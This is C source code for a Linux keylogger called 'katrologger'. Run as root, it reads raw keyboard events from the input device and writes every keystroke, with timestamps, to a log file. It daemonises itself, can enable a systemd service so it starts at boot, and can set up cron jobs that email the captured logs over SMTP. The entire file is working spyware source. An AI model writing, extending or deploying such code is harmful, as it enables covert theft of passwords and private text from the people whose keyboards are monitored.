#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>

// INCLUDES HEADERS
#include "mappings.h"
#include "event.h"
#include "status.h"
#include "usage.h"
#include "smtp_mail.h"

// CONFs
#define PATH_CONF "/root/.katrologger/config/path.conf"
#define TIME_CONF "/root/.katrologger/config/time.conf"
#define SIZE_CONF "/root/.katrologger/config/size.conf"
#define BOOT_CONF "/root/.katrologger/config/boot.conf"
#define SMTP_LOG "/root/.katrologger/logs/ksmtp.log"
#define CRON_SMTP "/var/spool/cron/cronjob"
#define CRON_SMTP_RUN "/var/spool/cron/crontabs/cronjob"
#define PID_FILE "/var/run/katrologger.pid"

//
const char *path_conf = PATH_CONF;
const char *time_conf = TIME_CONF;
const char *size_conf = SIZE_CONF;
const char *boot_conf = BOOT_CONF;
const char *smtp_log = SMTP_LOG;
const char *cron_file = CRON_SMTP;
const char *smtp_file = CRON_SMTP_RUN;
const char *pid_file = PID_FILE;

const char *dir_config = "/root/.katrologger";
const char *dev_input;

FILE *get_pid;
FILE *readpath;
FILE *readtime;
FILE *readsize;
FILE *readsmtp;
FILE *readboot;
FILE *filesize;
FILE *filetime;
FILE *filesmtp;
FILE *filepath;
FILE *fileboot;
FILE *key;
FILE *path_outfile;

int flag_running = 0;
int input_keyboard;

char *buffer_smtp;
char buffer_pid[32];
char buffer_filesmtp[1024];
char outfile[200];
char n_pid[20];
char cmd_str[256];

DIR *directory;

int kill_process(int kill_pid){
    if(kill(kill_pid, SIGKILL) != 0){
      perror("Error");
      exit(1);
    }
  return 0;
}

void noroot(char *msg) {
  fprintf(stderr, "[x] error privilege: %s\n", msg);
  printf("user UID:  %d\n", getuid());
  exit(1);
}

void systemctl(){
  char systemctl[256] = "systemctl is-enabled katrologger.service";
  FILE *cmd = popen(systemctl, "r");
  fgets(cmd_str, 256, cmd);
  cmd_str[strcspn(cmd_str, "\n")] = 0;
  pclose(cmd);
}

void daemon_process(){
  pid_t id_process = 0;
  pid_t sid = 0;

  id_process = fork();

  if (id_process < 0) {
    printf("fork failed!\n");
    exit(1);
  } else if(id_process > 0) {
    printf("[ + ] Keylogger started\n");
    printf("[ + ] File: %s\n", outfile);
    printf("[ + ] PID: %d\n", id_process);
    printf("[ ? ] Run '--status' for keylogger status\n");
  }

  sid = setsid();
  if(sid < 0) { exit(1); }
}

int main(int argc, char **argv) {

  keylogger_usage(argc, argv);

int check_root = getuid();
if (check_root != 0) { noroot("run as privileged user!"); }

if (flag_status == 1){
    check_status();
    if (flag_running == 1) {

      read_path();
      read_time();
      read_size();
      read_boot();

      system("clear");
      printf("●   Active - keylogger is running\n");
      printf("       Path: %s\n", buffer_path);
      printf("   Emailing: %s\n", buffer_smtp);
      printf(" Auto-start: %s\n", buffer_boot);
      printf("        PID: %s\n", buffer_pid);
      printf("     Memory: %s bytes\n", buffer_size);
      printf(" Start Time: %s\n\n", buffer_time);
      print_path_logs();
      printf("\n\n");

      fclose(readpath);
      fclose(readtime);
      fclose(readsize);
      fclose(readboot);

      free(buffer_smtp);
    } else if (flag_running == 0) {
        printf("[x] keylogger inactive\n");
        exit(1);
    }
    return 0;
} else if(flag_kill == 1) {

  if( (access(PID_FILE, F_OK)) == 0 ){
    get_pid = fopen(PID_FILE, "r");

    if(get_pid == NULL){
        printf("Error File Kill");
      exit(1);
    } else {
        fgets(buffer_pid, sizeof(buffer_pid), get_pid);
          int kill_pid = atoi(buffer_pid);
            kill_process(kill_pid);
            remove(PID_FILE);

            fclose(fopen(SIZE_CONF, "w"));
            fclose(fopen(SMTP_LOG, "w"));

            if( (access(CRON_SMTP, F_OK)) == 0 ) {
                remove(CRON_SMTP);
                remove(CRON_SMTP_RUN);
            }
            systemctl();
            if ( (strcmp(cmd_str, "enabled") ) == 0 )
            {
              system("systemctl disable katrologger.service >/dev/null 2>&1");
            }
            printf("[x] stop keylogger\n");
            exit(0);
        }
    } else {
      printf("[x] keylogger is not running\n");
      exit(1);
    }
} else if(smtp_status == 1){
  check_status();

  if (flag_running == 0) {
    printf("[x] keylogger inactive \n");

  } else if ( (access(smtp_file, F_OK)) == 0 ){
    readsmtp = fopen(SMTP_LOG, "r");

    while (fgets(buffer_filesmtp, sizeof(buffer_filesmtp), readsmtp) != NULL ) {
      printf("%s", buffer_filesmtp);
    }
    fclose(readsmtp);
    return 0;
  } else {
    printf("[x] SMTP disabled\n");
  }
  exit(0);
}

check_status();
if (flag_running == 1) {
    printf("[x] keylogger is already running\n");
    printf("Use: katrologger --status\n");
  exit(1);
}

if(flag_smtp == 1){ smtp_mail(argc, argv); }

path_outfile = fopen(outfile, "a");
if (path_outfile == NULL) {
  printf("katrologger: Specified path does not exist: %s\nkatrologger: try 'katrologger --help'\n", outfile);
  exit(1);
  } else {
  directory = opendir(dir_config);
  if (directory) {
        closedir(directory);
      } else if (ENOENT == errno) {
        mkdir(dir_config, S_IRWXU | S_IXGRP | S_IRGRP);
        closedir(directory);
      }

    if (no_bootable == 1) {
        systemctl();
        if ( (strcmp(cmd_str, "enabled") ) == 0 )
          {
            system("systemctl disable katrologger.service >/dev/null 2>&1");
          }
          fileboot = fopen(boot_conf, "w");
          fprintf(fileboot, "no");
          fclose(fileboot);

    } else if (no_bootable == 0){
        systemctl();
        if ( (strcmp(cmd_str, "disabled") ) == 0 )
          {
            system("systemctl enable katrologger.service >/dev/null 2>&1");
          }
          fileboot = fopen(boot_conf, "w");
          fprintf(fileboot, "yes");
          fclose(fileboot);
    }

  fprintf(path_outfile, "\n---------------------\n");
  fprintf(path_outfile, "| KEYLOGGER STARTED |\n");
  fprintf(path_outfile, "---------------------\n");
  fclose(path_outfile);

  // --- LOGGING ---
  time_t t;
  struct tm *timeinfo;
  char buffer_timeinfo[30];

  time (&t);
  timeinfo = localtime(&t);
  strftime(buffer_timeinfo,50,"%x %X", timeinfo);

  filetime = fopen(time_conf, "w");
  fprintf(filetime, "%s", buffer_timeinfo);
  fclose(filetime);

  filepath = fopen(path_conf, "w");
  fprintf(filepath, "%s", outfile);
  fclose(filepath);
  // --- END ---

  struct input_event events;
  dev_input = event_keyboard();
  input_keyboard = open(dev_input, O_RDONLY);

  // --- DAEMON ---
  if (no_daemon != 1) { daemon_process(); }

  // --- PID PROCESS ---
  int fd_pid = open(PID_FILE, O_RDWR | O_CREAT, 0600);
  if(fd_pid != -1){
    sprintf(n_pid, "%d", getpid());
      if( write(fd_pid, n_pid, strlen(n_pid)) == -1 ){
        perror("Error");
        exit(1);
      }
    close(fd_pid);
  }

FILE *kbd = fopen(dev_input, "r");

int flag_caps = 0;
int shift_pressed;

while (1) {

  fread(&events, sizeof(events), 1, kbd);
  if (events.type == EV_KEY && (events.code == KEY_LEFTSHIFT || events.code == KEY_RIGHTSHIFT))
  {
   switch (events.value)
    {
      case 0: shift_pressed=0; break;
      case 1: shift_pressed=1; break;
    }
  }

  read(input_keyboard, &events, sizeof(struct input_event));
  fflush(stdout);

    if( (events.type == EV_KEY) && (events.value == 0) ) {
      key = fopen(outfile, "a");

      if (events.code == 58) {
        if (flag_caps == 0) {
          flag_caps = 1;
        } else if (flag_caps == 1) {
          flag_caps = 0;
        }
      }

      if (events.code == 28 || events.code == 96) {

          time (&t);
          timeinfo = localtime(&t);
          strftime(buffer_timeinfo,50,"%x %X", timeinfo);
          fprintf(key, "\n %s > ", buffer_timeinfo);
          fclose(key);

    } else if (flag_caps == 0) {

      if (shift_pressed == 0) {
       fprintf(key, KeycodesNormal[events.code]);
       fclose(key);
      } else if (shift_pressed == 1) {
       fprintf(key, Shift[events.code]);
       fclose(key);
      }

    } else if (flag_caps == 1){
      fprintf(key, CapsLock[events.code]);
      fclose(key);
      }
    }
  }
}
    return 0;
}
